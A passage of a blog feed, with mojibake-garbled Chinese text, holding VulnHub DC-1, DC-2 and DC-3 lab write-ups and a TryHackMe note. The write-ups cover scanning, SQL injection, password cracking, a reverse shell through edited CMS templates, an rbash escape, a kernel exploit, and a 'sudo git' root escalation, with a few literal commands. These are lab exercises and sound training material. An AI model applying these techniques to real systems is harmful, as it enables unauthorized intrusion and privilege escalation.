´å¯†ç (å­—å…¸å¾ˆé‡è¦) ç„¶åæŠ“åŒ…ä¿®æ”¹å‘½ä»¤ åå¼¹shellã€‚è®°å¾—å¤šè§‚å¯Ÿï¼Œåœ¨homeç›®å½•ä¸‹å‘ç°ä¸‰ä¸ªç”¨æˆ·ï¼Œæ‰¾åˆ°çˆ†ç ´å¯†ç å­—å…¸ hydraçˆ†ç ´ç™»å½•ï¼Œæ³¨æ„è§‚å¯Ÿä¿¡æ¯ï¼Œåœ¨é‚®ç®±ä¸­æ‰¾åˆ°å¦å¤–ä¸€ä¸ªç”¨æˆ·çš„å¯†ç ã€‚sshç™»å½•ä¸Šå»ï¼Œåˆ†åˆ«å¯¹ä¸¤ä¸ªç”¨æˆ·è¿›è¡Œææƒï¼Œå‘ç°jimä¸å¯ä»¥ï¼Œç„¶åå°±æ˜¯teeheeææƒå³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pentesting Fundamentalsï¼ŒPrinciples of Securityæ¦‚å¿µ</title>
    <link href="/2024/04/06/Jr%20Penetration%20Tester/"/>
    <url>/2024/04/06/Jr%20Penetration%20Tester/</url>
    
    <content type="html"><![CDATA[<h2 id="Pentesting-Fundamentals"><a href="#Pentesting-Fundamentals" class="headerlink" title="Pentesting Fundamentals"></a>Pentesting Fundamentals</h2><p>ä¸»è¦ä»‹ç»äº†ä»€ä¹ˆæ˜¯æ¸—é€æµ‹è¯•ï¼Œä»¥åŠæ¸—é€æµ‹è¯•çš„å¤§æ¦‚æµç¨‹æ˜¯æ€æ ·çš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404172103132.png" alt="image-20240417210322923"></p><p>ä»¥åŠä»‹ç»äº†ä¸€äº›é»‘ç›’ï¼Œç°ç›’ï¼Œç™½ç›’æµ‹è¯•ç­‰ã€‚</p><p>é»‘ç›’æµ‹è¯•:æµ‹è¯•äººå‘˜ä¸ä¼šè·å¾—æœ‰å…³å†…éƒ¨å·¥ä½œçš„ä»»ä½•ä¿¡æ¯,åº”ç”¨ç¨‹åºæˆ–æœåŠ¡ï¼Œç›¸å½“äºæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·å¯¹è¿™ä¸ªæœåŠ¡è¿›è¡Œæ¸—é€ï¼Œé€šè¿‡å¯¹ç¨‹åºçš„ä¸€äº›äº¤äº’æ¥è¿›è¡Œæµ‹è¯•ã€‚éœ€è¦åœ¨ä¿¡æ¯æ”¶é›†å’Œæšä¸¾è¿™æ–¹é¢ä¸‹åŠŸå¤«ã€‚</p><p>ç°ç›’æµ‹è¯•:æµ‹è¯•äººå‘˜å¯¹å†…éƒ¨å·¥ä½œçš„æ¶ˆæ¯çŸ¥é“çš„å†…å®¹å¹¶ä¸å¤šï¼Œç›¸å½“äºæ˜¯ç™½ç›’å’Œé»‘ç›’çš„ç»“åˆã€‚</p><p>ç™½ç›’æµ‹è¯•:æµ‹è¯•äººå‘˜äº†è§£å†…éƒ¨å·¥ä½œé€»è¾‘ï¼Œä¿¡æ¯æ›´å¤šï¼Œç€æ‰‹ç‚¹æ›´å¤šã€‚</p><h2 id="Principles-of-Security"><a href="#Principles-of-Security" class="headerlink" title="Principles of Security"></a>Principles of Security</h2><p>è¿™é‡Œä¸»è¦ä»‹ç»äº†ä¸€äº›å®‰å…¨åŸåˆ™</p><p>å®Œæ•´æ€§ï¼Œä¿å¯†æ€§ï¼Œå¯ç”¨æ€§</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262206614.png" alt="image-20240426220636310"></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2024/04/02/DC-3/"/>
    <url>/2024/04/02/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052207803.png" alt="image-20240405220728137"></p><p>å¼€æ”¾äº†80ç«¯å£</p><p>ç„¶åå»è®¿é—®ï¼Œåœ¨index.php å¯ä»¥çœ‹åˆ°æç¤ºä¿¡æ¯ï¼Œä»¥åŠå­˜åœ¨adminç”¨æˆ·ï¼Œå¯ä»¥å°è¯•çˆ†ç ´ä¸€ä¸‹å¯†ç  (æœ€ç»ˆæ˜¯è¦è·å¾—rootæƒé™çš„)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052212871.png" alt="image-20240405221239805"></p><p>æ— æœï¼Œå»æ‰«ä¸€ä¸‹åå°</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052309233.png" alt="image-20240405230935914"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ç„¶åçœ‹äº†ä¸€ä¸‹æ˜¯ä¸ªCMS å»æ‰¾ä¸€ä¸‹å®ƒçš„æ¼æ´ä¿¡æ¯</p><p>æ‰¾åˆ°äº†ä¸€ä¸ªSQLæ³¨å…¥ç±»å‹çš„ =&gt;<a href="https://blog.csdn.net/smli_ng/article/details/115799954">https://blog.csdn.net/smli_ng/article/details/115799954</a></p><p>sqlmapè·‘èµ·æ¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052318368.png" alt="image-20240405231859209"></p><p>å¯ä»¥è·‘å‡ºæ¥hh</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052343848.png" alt="image-20240405234308671"></p><p>æœ€åå¯†ç åˆ©ç”¨johnè¿›è¡Œè§£å¯†å³å¯</p><p>æŠŠè¦è§£å¯†çš„ä»£ç æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ ç„¶åjohnè§£å¯†å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404052345750.png" alt="image-20240405234538635"></p><p>å¾—åˆ°äº†å¯†ç å¯ä»¥ç™»å½•åå°(æ³¨æ„æ˜¯åœ¨/administraatorç›®å½•ä¸‹)</p><p>è¿›å…¥äº†åå°ä¹‹åï¼Œå¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç‚¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061413063.png" alt="image-20240406141342877"></p><p>å¯ä»¥çœ‹åˆ°ä¸€äº›phpä»£ç  æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¿®æ”¹ä»£ç </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061416999.png" alt="image-20240406141633946"></p><p>ç„¶åå¯ä»¥è¿›è¡Œä¸€ä¸ªåå¼¹shell</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061533432.png" alt="image-20240406153354345"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061534212.png" alt="image-20240406153440076"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬åˆ°ç°åœ¨ç®—æ˜¯æœ‰äº†æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦è¿›è¡Œææƒ</p><p>æŸ¥è¯¢ä¸€ä¸‹å½“å‰ç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/i</span>ssue<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061615965.png" alt="image-20240406161551902"></p><p>16.04çš„ï¼ŒæŸ¥äº†ä¸€ä¸‹æ˜¯æœ‰ææƒæ¼æ´çš„ã€‚(å†…æ ¸ææƒ)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061619679.png" alt="image-20240406161954441"></p><p>ç„¶åå°±æ˜¯å»æœç´¢ä¸€ä¸‹searchsploitçš„å…·ä½“ç”¨æ³•</p><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨39772çš„ æ˜¯ä¸€ä¸ªç‰¹æƒå‡çº§æ¼æ´</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061639454.png" alt="image-20240406163944326"></p><p>ç»™å‡ºäº†å…·ä½“çš„ä½ç½®ä¿¡æ¯ å»çœ‹çœ‹æœ‰ä»€ä¹ˆå†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061640801.png" alt="image-20240406164059639"></p><p>å¯ä»¥çœ‹è§ä¸‹è½½åœ°å€å’Œå…·ä½“ç”¨æ³•</p><p>ä¸‹é¢è¯•å…·ä½“çš„æ­¥éª¤:</p><ol><li>åœ¨dc-3é¶æœºä¸­é€šè¿‡wgetä¸‹è½½è¿™ä¸ªzipæ–‡ä»¶ ç„¶ååˆ©ç”¨unzipè¿›è¡Œè§£å‹</li></ol><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061644633.png" alt="image-20240406164447545"></p><p>2.ç„¶åå†è§£å‹exploit.tar è¿™ä¸ªæ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061647648.png" alt="image-20240406164727558"></p><p>è¿›å»è¿™ä¸ªç›®å½•</p><p>3.æ ¹æ®ä¸Šé¢çš„è¦æ±‚æ¥è¿è¡Œå…·ä½“æ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061649637.png" alt="image-20240406164933578"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404061651932.png" alt="image-20240406165139817"></p><p>æœ€ç»ˆä¹Ÿæ˜¯ææƒæˆåŠŸ</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é¦–å…ˆæ ¹æ®æç¤ºçš„ä¿¡æ¯ï¼Œå…ˆè¦è·å¾—shell,ç„¶åè¿›è¡Œææƒ,æˆ‘ä»¬é€šè¿‡cmsç‰ˆæœ¬ä¿¡æ¯æ‰¾åˆ°æ¼æ´åˆ©ç”¨ï¼Œç„¶åé€šè¿‡sqlæ³¨å…¥æ‰¾åˆ°åå°adminç™»å½•å¯†ç ï¼Œåˆ©ç”¨johnå¯¹å¯†ç è¿›è¡Œä¸€ä¸ªè§£å¯†</p><p>ç™»å½•è¿›å»ä¹‹åå°±æ˜¯æ‰¾å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œç„¶åæ‰¾åˆ°äº†å¯ä»¥è¿è¡Œphpä»£ç çš„åœ°æ–¹ï¼Œåˆ©ç”¨bash -cè¿›è¡Œä¸€ä¸ªåå¼¹shellã€‚åˆ°è¿™é‡Œå°±æ˜¯ææƒäº†ï¼Œfindææƒæ— æœï¼ŒæŸ¥è¯¢å†…æ ¸ç‰ˆæœ¬ï¼Œå‘ç°ç‰ˆæœ¬è¾ƒä½ï¼Œåˆ©ç”¨searchsploitæœç´¢å†…æ ¸æ¼æ´ä¿¡æ¯ï¼Œæ‰¾åˆ°äº†ä¿¡æ¯ä¹‹åå°±æ˜¯å»åˆ©ç”¨ï¼Œæœ€ç»ˆææƒæˆåŠŸã€‚</p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2024/04/01/DC-2/"/>
    <url>/2024/04/01/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282317754.png" alt="image-20240328231730586"></p><p>åˆ©ç”¨nmapè¿›è¡Œæ‰«æï¼Œå¯ä»¥çœ‹åˆ°å¼€æ”¾äº†80å’Œ7744ç«¯å£ï¼Œä½†å»è®¿é—®æ²¡å•¥å†…å®¹</p><p>ç„¶åç”¨dirsearchæ‰«åå°ï¼Œå¯ä»¥æ‰«å‡ºæ¥ç›¸å…³çš„è·¯å¾„</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282057978.png" alt="image-20240328205748795"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>å»è®¿é—®index.php ç„¶åå°±å¯ä»¥çœ‹åˆ°flag1</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282239933.png" alt="image-20240328223939777"></p><p>æ ¹æ®flag1çš„æç¤º è²Œä¼¼æ˜¯éœ€è¦çˆ†ç ´å¯†ç  ç„¶åå®ƒç»™äº†ä¸€ä¸ªcewl å»æœç´¢ä¸€æ³¢</p><p>å®ƒæ˜¯ä¸€ä¸ªå­—å…¸ç”Ÿæˆå·¥å…·</p><p>å‚è€ƒ:<a href="https://developer.aliyun.com/article/1089966">https://developer.aliyun.com/article/1089966</a></p><p>ç„¶åè¿™é‡Œçš„è¯æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªå¯†ç æ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282325249.png" alt="image-20240328232528171"></p><p>ç°åœ¨å¯†ç å­—å…¸æœ‰äº† å°±å·®ä¸€ä¸ªç”¨æˆ·åçš„</p><p>ç„¶åæœäº†ä¸€ä¸‹wpscanè¿™ä¸ªå·¥å…·çš„ç”¨æ³•å’Œä¸€äº›ç®€å•ä»‹ç»</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282339323.png" alt="image-20240328233928260"></p><p>å‚è€ƒé“¾æ¥:</p><p><a href="https://blog.csdn.net/guo15890025019/article/details/118548932">https://blog.csdn.net/guo15890025019/article/details/118548932</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282349700.png" alt="image-20240328234958565"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403282350418.png" alt="image-20240328235012283"></p><p>æœ€ç»ˆå¯ä»¥å¾—åˆ°3ä¸ªè´¦æˆ·  ç„¶åç»“åˆå‰é¢çš„å­—å…¸ å»çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403291014625.png" alt="image-20240329101357455"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>è®°å¾—æ¯ä¸ªç”¨æˆ·éƒ½å»ç™»å½•çœ‹çœ‹ ä¸è¦æ­»ç£•ä¸€ä¸ªç”¨æˆ·(Orz)</p><p>ç™»å½•tomç”¨æˆ·çš„è¯æ²¡æ‰¾åˆ°å•¥å†…å®¹ ç„¶åè¯•äº†ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼  ä¹Ÿä¸å¾—è¡Œ</p><p>ç™»å½•jerryç”¨æˆ· å¯ä»¥æ‰¾åˆ°flag2çš„ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011106014.png" alt="image-20240401110606904"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011107040.png" alt="image-20240401110703945"></p><p>è®©æˆ‘ä»¬æ‰¾å¦ä¸€æ¡æ€è·¯ï¼Ÿ</p><p>æ³¨æ„ä¸Šé¢çš„sshæœåŠ¡ å¯ä»¥å…ˆè¯•è¯•è¿™ä¸¤ä¸ªè´¦å·çš„sshç™»å½•</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>ä½¿ç”¨tomç™»å½•ä¹‹å å¯ä»¥çœ‹åˆ°flag3.txt</p><p>ä½†æ˜¯catç­‰å‘½ä»¤è¢«ç¦æ­¢äº† æˆ‘ä»¬å¯ä»¥ä½¿ç”¨lessæ¥æŸ¥çœ‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011116199.png" alt="image-20240401111648120"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011117327.png" alt="image-20240401111705230"></p><p>å†è¯•è¯•Jerryè¿›è¡Œç™»å½•</p><p>ç™»å½•ä¸ä¸Šå»ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>æ ¹æ®ä¸Šé¢flag3 çŒœæµ‹æ˜¯åœ¨tomç”¨æˆ·ä¸‹ åˆ‡æ¢åˆ°jerryç”¨æˆ· ä½†æ˜¯åœ¨å½“å‰çš„ç¯å¢ƒä¸­æ²¡æœ‰suè¿™ä¸ªå‘½ä»¤</p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹å½“å‰ç¯å¢ƒèƒ½ç”¨çš„å‘½ä»¤æœ‰å¤šå°‘</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">compgen -c</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ—å‡ºåœ¨bashç¯å¢ƒä¸­æ‰€æœ‰å¯ç”¨çš„å‘½ä»¤</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011140685.png" alt="image-20240401114037624"></p><p>exportå¯ä»¥ä¿®æ”¹ç¯å¢ƒå˜é‡ </p><p>ç›´æ¥ä¿®æ”¹çš„è¯ PATHæ˜¯åªè¯»çš„ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011149574.png" alt="image-20240401114918524"></p><p>æŸ¥äº†ä¸€ä¸‹éœ€è¦ç»•è¿‡rbash</p><p>å‚è€ƒé“¾æ¥:<a href="https://xz.aliyun.com/t/7642?time__1311=n4+xnD0G0=G=eAK0QbDsA3OrYGCQb=DRnDGqrwD&amp;alichlgref=https://www.google.com/">https://xz.aliyun.com/t/7642?time__1311=n4%2BxnD0G0%3DG%3DeAK0QbDsA3OrYGCQb%3DDRnDGqrwD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p>å¯ä»¥åˆ©ç”¨viæ¥è¿›è¡Œé€ƒé€¸rbash</p><p>æˆ‘ä»¬åœ¨flag3.txtä¸­åˆ©ç”¨viè¿›è¡Œé€ƒé€¸</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011349141.png" alt="image-20240401134945018"></p><p>ç„¶åå›è½¦</p><p>å†è¾“å…¥ :shell å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011350121.png" alt="image-20240401135017072"></p><p>ä½†æ­¤æ—¶è™½ç„¶èƒ½cdäº† ä½†æ˜¯caté‚£äº›å‘½ä»¤ä»ç„¶ä¸èƒ½ä½¿ç”¨</p><p>å¯ä»¥åˆ©ç”¨exportè®¾ç½®ç¯å¢ƒå˜é‡</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011351267.png" alt="image-20240401135152215"></p><p>ç„¶åæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥è½¬åˆ°jerryç”¨æˆ·äº†</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>suè½¬åˆ°jerryç”¨æˆ·ä¹‹åå°±å¯ä»¥æŸ¥çœ‹flag4äº†</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011354263.png" alt="image-20240401135434153"></p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>æœ€åä¸€ä¸ªäº† åº”è¯¥æ˜¯è¦ææƒ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011402790.png" alt="image-20240401140218749"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011408656.png" alt="image-20240401140846535"></p><p>å»æœä¸€ä¸‹gitææƒ</p><p>å‚è€ƒé“¾æ¥:</p><p><a href="https://blog.csdn.net/qq_38612882/article/details/122772867">https://blog.csdn.net/qq_38612882/article/details/122772867</a></p><p>ææƒè¿‡ç¨‹ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sudo git help config<br>!<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>æœ€åææƒæˆåŠŸ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404011414045.png" alt="image-20240401141428005"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>flag1 å°±æ˜¯æ‰«ä¸€ä¸‹ç›®å½•çš„äº‹æƒ…</p><p>flag2æ˜¯åˆ©ç”¨cewlç”Ÿæˆç™»å½•å¯†ç å­—å…¸ ç„¶åç»“åˆwpscanå°±å¯ä»¥æŠŠç™»å½•åå’Œå¯†ç çˆ†ç ´å‡ºæ¥ æ³¨æ„æ¯ä¸ªéƒ½è¦è¯•è¯• </p><p>flag3: nmapæ‰«æç«¯å£ä¼šæœ‰ä¸€ä¸ªsshæœåŠ¡ å¯ä»¥å»ç™»å½• </p><p>flag4:ç»•è¿‡rbashçš„é™åˆ¶ </p><p>flag5: gitææƒ</p>]]></content>
    
    
    <categories>
      
      <category>é¶æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2024/03/27/DC-1/"/>
    <url>/2024/03/27/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-1é¶æœº"><a href="#DC-1é¶æœº" class="headerlink" title="DC-1é¶æœº"></a>DC-1é¶æœº</h1><h2 id="å‰ç½®å‡†å¤‡ï¼š"><a href="#å‰ç½®å‡†å¤‡ï¼š" class="headerlink" title="å‰ç½®å‡†å¤‡ï¼š"></a>å‰ç½®å‡†å¤‡ï¼š</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p><p>å®‰è£…è¿‡ç¨‹ï¼š</p><p>ä¸‹è½½ä¸‹æ¥åè§£å‹ç¼©ï¼Œåœ¨VMwareä¸­æ‰“å¼€</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271741086.png" alt="image-20240327174123994"></p><p>ç„¶åå¯¼å…¥å°±è¡Œäº†ï¼Œå¦‚æœå¤±è´¥é‡è¯•å°±è¡Œï¼Œæ¥ä¸‹æ¥æŠŠCD-1é¶æœºçš„ç½‘ç»œé€‚é…å™¨æ”¹æˆNATæ¨¡å¼ï¼Œè¿™é‡Œçš„è¯kaliä¹Ÿæ”¹æˆnatæ¨¡å¼ï¼Œç¡®ä¿ä¸¤è€…åœ¨åŒä¸€ç½‘æ®µä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271741160.png" alt="image-20240327174108089"></p><h1 id="æ‰“é¶è¿‡ç¨‹"><a href="#æ‰“é¶è¿‡ç¨‹" class="headerlink" title="æ‰“é¶è¿‡ç¨‹"></a>æ‰“é¶è¿‡ç¨‹</h1><h2 id="1-ä¿¡æ¯æ”¶é›†"><a href="#1-ä¿¡æ¯æ”¶é›†" class="headerlink" title="1.ä¿¡æ¯æ”¶é›†"></a>1.ä¿¡æ¯æ”¶é›†</h2><p>é¦–å…ˆä½¿ç”¨nmapæ‰«æç«¯å£ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271347436.png" alt="image-20240327134724284"></p><p>åˆ©ç”¨wappalyzerå¯ä»¥æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271349139.png" alt="image-20240327134902094"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªCMS phpç‰ˆæœ¬æ˜¯5.4.45 æˆ‘ä»¬å»msfä¸­æœç´¢ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271351808.png" alt="image-20240327135119564"></p><p>å¯ä»¥çœ‹åˆ°æ—¥æœŸä¿¡æ¯ æˆ‘ä»¬ä½¿ç”¨æœ€æ–°çš„è¯•è¯•çœ‹</p><h2 id="2-æ¼æ´åˆ©ç”¨"><a href="#2-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.æ¼æ´åˆ©ç”¨"></a>2.æ¼æ´åˆ©ç”¨</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>ç„¶åè®¾ç½®ä¸€ä¸‹ä¿¡æ¯ å°±å¯ä»¥runäº† </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271359063.png" alt="image-20240327135917943"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271402007.png" alt="image-20240327140257966"></p><p>åˆ©ç”¨pythonå®ç°ä¸€ä¸‹äº¤äº’shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271403258.png" alt="image-20240327140344185"></p><p>è¿™é‡Œå¯ä»¥æ‰¾åˆ°flag1</p><p>æŸ¥çœ‹flag1.txt æç¤ºè®©æˆ‘ä»¬æ‰¾åˆ°é…ç½®æ–‡ä»¶</p><p>å»ç½‘ä¸Šæœä¸€ä¸‹Drupalçš„é…ç½®æ–‡ä»¶çš„ä½ç½®ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271409272.png" alt="image-20240327140926216"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>ç„¶åå¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶çš„å†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271620653.png" alt="image-20240327162021558"></p><p>å¯ä»¥çœ‹åˆ°æ•°æ®åº“çš„é…ç½®ä¿¡æ¯ï¼Œå…ˆè¿æ¥ä¸€æ³¢</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271631627.png" alt="image-20240327163120510"></p><p>ç„¶åå¯ä»¥æ‰¾åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼Œä½†æ˜¯å¯†ç æ˜¯åŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å¯¹å¯†ç è¿›è¡Œä¸€ä¸ªæ›´æ”¹ã€‚</p><p>åœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹å‘ç°æ˜¯å¯ä»¥çš„ï¼Œå…ˆç”Ÿæˆä¸€ä¸ªæ–°çš„å¯†ç ï¼Œç„¶ååˆ°æ•°æ®åº“é‡Œé¢è¿›è¡Œæ›´æ–°å³å¯</p><p>å‚è€ƒæ–‡ç« :<a href="https://cloud.tencent.com/developer/ask/sof/110990932">https://cloud.tencent.com/developer/ask/sof/110990932</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271654037.png" alt="image-20240327165423977"></p><p>ç„¶åå†è¿›è¡Œç™»å½• admin admin</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>ç„¶åå°±å¯ä»¥æ‰¾åˆ°flag3</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271656789.png" alt="image-20240327165607699"></p><h3 id="flag4"><a href="#flag4" class="headerlink" 